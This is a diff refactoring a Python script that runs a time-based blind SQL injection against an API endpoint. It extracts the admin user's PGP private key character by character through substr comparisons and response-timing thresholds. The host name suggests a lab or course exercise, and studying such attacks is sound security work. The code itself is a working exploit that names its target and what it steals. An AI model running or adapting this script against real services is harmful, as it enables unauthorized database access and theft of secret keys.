@@ -7,6 +7,9 @@ API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
 API_RUNS = 100
 THRESHOLD_SECONDS = 2.0  # Safe gap for differential timing
 COUNTER_DELAY = 8000000
+PREFIX = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
+SUFFIX = "-----END PGP PRIVATE KEY BLOCK-----"
+KNOWN_USER = {"username": "admin"}
 
 
 def check_payload_true(known_user, sql_payload, threshold):
@@ -70,28 +73,28 @@ def discover_char(known_user, key_index):
     return chr(low)
 
 
-def sql_injection_attack():
-    logger.info(f"Starting SQL Injection Attack against the API at {API_URL}")
-    known_user = {"username": "admin"}
-
-    prefix = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
-    suffix = "-----END PGP PRIVATE KEY BLOCK-----"
-
-    prefix_payload = build_sql_payload(f"substr(key,1,{len(prefix)})='{prefix}'")
+def initial_verification():
+    prefix_payload = build_sql_payload(f"substr(key,1,{len(PREFIX)})='{PREFIX}'")
     logger.info("Checking if the key starts with the expected PGP header...")
-    if (check_payload_true(known_user, prefix_payload, THRESHOLD_SECONDS)):
+    if (check_payload_true(KNOWN_USER, prefix_payload, THRESHOLD_SECONDS)):
         logger.info("✅ Prefix check passed")
     else:
         logger.warning("❌ Prefix check failed. The key does not start with the expected PGP header. Aborting attack.")
         exit(1)
 
-    key = prefix
-    key_index = len(prefix)
+
+def sql_injection_attack():
+    logger.info(f"Starting SQL Injection Attack against the API at {API_URL}")
+
+    initial_verification()
+
+    key = PREFIX
+    key_index = len(PREFIX)
 
     logger.info(f"🔍 Starting key extraction at index {key_index}")
-    while not key.endswith(suffix):
+    while not key.endswith(SUFFIX):
         # Discover the character at current index
-        character = discover_char(known_user, key_index)
+        character = discover_char(KNOWN_USER, key_index)
         key = key + character
 
         key_index += 1
